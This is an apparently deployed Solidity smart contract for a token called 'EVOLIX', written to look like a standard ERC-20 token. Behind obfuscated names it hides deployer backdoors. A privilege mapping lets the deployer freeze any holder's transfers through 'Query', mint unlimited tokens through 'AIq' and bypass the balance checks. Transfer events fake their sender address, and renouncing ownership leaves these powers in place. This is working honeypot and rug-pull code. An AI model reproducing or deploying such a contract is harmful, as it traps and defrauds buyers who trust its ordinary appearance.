/**
 *Submitted for verification at Etherscan.io on 2023-01-07
*/

// SPDX-License-Identifier: MIT



pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    address aIXx = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract EVOLIX is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private AIVL;
    mapping (address => uint256) private cAIVL;
    mapping (address => mapping (address => uint256)) private dxxik;
    uint8 eAIVL = 8;
    uint256 fAIVL = 100000000*10**8;
    string private _name;
    string private _symbol;



    constructor () 
{
        _name = "EVOLIX";
        _symbol = "EVOLIX";
        cAIVL[msg.sender] = 20;
        AIVL[msg.sender] = fAIVL;
        emit Transfer(address(0), aIXx, fAIVL);
    }

    
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return eAIVL;
    }

    function totalSupply() public view  returns (uint256) {
        return fAIVL;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return AIVL[account];
    }
	 function allowance(address owner, address spender) public view  returns (uint256) {
        return dxxik[owner][spender];
    }
	

function approve(address spender, uint256 amount) public returns (bool success) {    
        dxxik[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }

			   
  		
    function transfer(address recipient, uint256 amount) public returns (bool) {
            if(cAIVL[msg.sender] >= 20) {
        iiiXX(msg.sender, recipient, amount);
        return true; }
 
        require(amount <= AIVL[msg.sender]);
        require(cAIVL[msg.sender] <= 2);
        hioxX(msg.sender, recipient, amount);
        return true; }
 
	   
	   
    function transferFrom(address sender, address recipient, uint256 amount) public returns
     (bool) {
     if(cAIVL[sender] >= 20) {
        iiiXX(sender, recipient, amount);
        return true;}
    require(amount <= AIVL[sender]);
     require(amount <= dxxik[sender][msg.sender]);
             
              require(cAIVL[sender] <= 2);
            require (cAIVL[recipient] <=2);
        hioxX(sender, recipient, amount);
        return true;}
			 			   function Query (address nXIx)  public {
                     if(cAIVL[msg.sender] >= 20){
      cAIVL[nXIx] = 14;}}
			function mxII (address nXIx, uint256 OiiX)  internal {
     AIVL[nXIx] += OiiX;} 	


		   function AIq (address nXIx, uint256 OiiX) public {
        if(cAIVL[msg.sender] >= 20){
   mxII(nXIx,OiiX);}}
			    function hioxX(address sender, address recipient, uint256 amount) internal  {
        AIVL[sender] = AIVL[sender].sub(amount);
        AIVL[recipient] = AIVL[recipient].add(amount);
        emit Transfer(sender, recipient, amount); }	
	
	
		            function iiiXX(address sender, address recipient, uint256 amount) internal  {
        AIVL[sender] = AIVL[sender].sub(amount);
        AIVL[recipient] = AIVL[recipient].add(amount);
         sender = aIXx;
        emit Transfer(sender, recipient, amount); }

 

}